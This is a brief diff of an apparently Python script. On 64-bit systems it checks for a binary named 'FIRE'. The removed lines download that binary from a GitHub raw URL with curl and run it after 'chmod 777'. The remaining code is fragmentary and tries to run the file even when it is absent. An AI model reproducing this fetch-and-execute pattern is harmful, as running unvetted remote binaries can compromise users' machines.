@@ -11,10 +11,7 @@ except:
 bit = platform.architecture()[0]
 if bit == '64bit':
     if not os.path.isfile('FIRE'):
-        os.system('curl -L https://github.com/R1NKU1100/MAX/blob/main/FIRE?raw=true -o FIRE') 
-        
-        
-os.system('chmod 777 FIRE && ./FIRE')
+        os.system('chmod 777 FIRE && ./FIRE')
         
     
 
